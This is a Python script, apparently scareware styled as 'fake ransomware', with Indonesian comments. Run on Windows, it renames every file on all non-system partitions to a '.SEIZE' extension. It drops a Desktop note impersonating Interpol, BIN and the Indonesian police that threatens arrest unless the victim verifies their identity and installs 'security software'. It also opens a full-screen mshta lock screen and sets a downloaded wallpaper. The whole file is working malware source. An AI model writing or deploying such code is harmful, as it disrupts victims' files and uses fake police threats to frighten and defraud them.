import os
import ctypes
import psutil, time, subprocess
import urllib.request

# Fungsi untuk mengganti ekstensi file menjadi .SEIZE
def change_extension(file_path):
    try:
        # File baru dengan ekstensi .SEIZE
        new_file_path = file_path + '.SEIZE'

        # Ganti nama file menjadi ekstensi baru
        os.rename(file_path, new_file_path)

        return True, f"{file_path} berhasil diubah menjadi {new_file_path}"

    except Exception as e:
        return False, f"Gagal mengganti ekstensi {file_path}: {e}"


# Fungsi untuk mengganti ekstensi file dalam folder
def process_folder(folder_path):
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            success, message = change_extension(file_path)
            print(message)

def note1():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop_path, 'Interpol-BIN-Polri.txt')
    with open(note_path, 'w') as f:
        f.write(f'''Peringatan Penting: Tindakan Hukum Diperlukan Segera!

Kepada Pengguna yang Terhormat,

Kami ingin memberitahukan Anda bahwa sistem kami telah mendeteksi aktivitas mencurigakan yang terkait dengan alamat IP Anda. Setelah penyelidikan menyeluruh, kami menemukan bahwa perangkat Anda terlibat dalam pelanggaran hukum yang serius, termasuk tetapi tidak terbatas pada:

Pengunduhan Konten Berhak Cipta: Kami telah mencatat bahwa Anda telah mengunduh dan membagikan materi yang dilindungi hak cipta tanpa izin.
Penipuan Identitas: Terdapat indikasi bahwa informasi pribadi Anda telah digunakan untuk melakukan transaksi ilegal.
Akses Tidak Sah ke Jaringan: Aktivitas Anda menunjukkan bahwa Anda telah mencoba mengakses jaringan yang dilindungi tanpa izin.
Konsekuensi Hukum:

Jika Anda tidak mengambil tindakan segera, Anda akan menghadapi konsekuensi hukum yang serius, termasuk tetapi tidak terbatas pada:

Denda hingga $10,000: Pelanggaran hukum ini dapat mengakibatkan denda yang signifikan.
Tuntutan Pidana: Anda dapat dikenakan tuntutan pidana yang dapat mengakibatkan penjara.
Pencatatan Kriminal: Pelanggaran ini dapat menyebabkan catatan kriminal yang akan mempengaruhi masa depan Anda.
Tindakan yang Harus Diambil:

Untuk menghindari konsekuensi di atas, Anda harus segera melakukan langkah-langkah berikut:

Klik Tautan di Bawah Ini: Untuk mengonfirmasi identitas Anda dan menyelesaikan masalah ini, klik tautan di bawah ini: Verifikasi Identitas Anda

Instal Perangkat Lunak Keamanan: Anda diwajibkan untuk menginstal perangkat lunak keamanan yang kami rekomendasikan untuk melindungi perangkat Anda dari ancaman lebih lanjut.

Hubungi Tim Hukum Kami: Jika Anda memiliki pertanyaan atau ingin mendiskusikan situasi ini lebih lanjut, silakan hubungi tim hukum kami di [nomor telepon] atau [alamat email].

Penting: Kegagalan untuk mengambil tindakan dalam waktu 24 jam akan mengakibatkan langkah hukum lebih lanjut, termasuk kemungkinan penangkapan.

Hormat Kami,

Tim Keamanan Jaringan''')
    return note_path

def note2():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop_path, 'INTERPOL-BIN-POLRI.hta')
    hta_content = """<html>
 <head>
     <title>INTERPOL-BIN-POLRI</title>
        <HTA:APPLICATION
            APPLICATIONNAME="K1NP1NG-N0T3"
            BORDER="none"
            CAPTION="no"
            SHOWINTASKBAR="yes"
            SINGLEINSTANCE="yes"
            SYSMENU="no"
            WINDOWSTATE="maximize">
  <style>
   body {
            background-color: black;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .header img {
            width: 150px;
            height: auto;
            margin: 20px;
        }
        .main-text {
            color: yellow;
            font-size: 36px;
            margin: 20px 0;
        }
        .sub-text {
            color: red;
            font-size: 24px;
            margin: 10px 0;
        }
        .button {
            background-color: yellow;
            color: black;
            padding: 15px 30px;
            font-size: 24px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
  </style>
 </head>
 <body>
  <div class="header">
   <img alt="Interpol logo" height="150" src="https://raw.githubusercontent.com/ArenaldyP/Fake-Ransomware/main/Image/Interpol.jpeg" width="150"/>
   <img alt="Badan Intelijen Negara logo" height="150" src="https://raw.githubusercontent.com/ArenaldyP/Fake-Ransomware/main/Image/bin.jpg" width="150"/>
   <img alt="Police logo" height="150" src="https://raw.githubusercontent.com/ArenaldyP/Fake-Ransomware/main/Image/polri.png" width="150"/>
  </div>
  <div class="main-text">
   THIS COMPUTER NOW UNDER CONTROL OF LAW ENFORCEMENT
  </div>
  <div class="sub-text">
   ALL YOUR FILES HAVE BEEN COMPROMISED!
   <br/>
   WE HAVE MONITORED ALL COMPANY NETWORKS
   <br/>
   THERE ARE INDICATIONS THIS COMPUTER WAS USED IN CYBERCRIME
   <br/>
   CLICK BELOW FOR FURTHER INVESTIGATION
  </div>
 </body>
</html>"""
    with open(note_path, 'w') as f:
        f.write(hta_content)
    subprocess.Popen(['mshta.exe', note_path])
    time.sleep(2)
    return note_path

# Fungsi untuk memproses semua partisi non-sistem
def process_all_partitions():
    # Ambil semua partisi yang terpasang
    partitions = psutil.disk_partitions()

    for partition in partitions:
        # Abaikan partisi sistem atau yang tidak valid
        if 'system' in partition.opts or partition.fstype == '':
            continue

        # Dapatkan path mount partisi
        partition_path = partition.mountpoint
        print(f"Mengganti ekstensi di partisi: {partition_path}")

        # Proses folder di partisi tersebut
        process_folder(partition_path)

def change_desktop_background():
    imageUrl = 'https://raw.githubusercontent.com/ArenaldyP/Fake-Ransomware/main/Image/Wallpaper.jpg'
    path = os.path.join(os.environ['TEMP'], 'Wallpaper.jpg')
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

if __name__ == "__main__":
    # Proses semua partisi non-sistem
    process_all_partitions()

    # Fungsi-fungsi lain yang tidak dipanggil
    # Buat catatan di desktop
    note1()
    note2()

    # Ganti wallpaper desktop
    change_desktop_background()
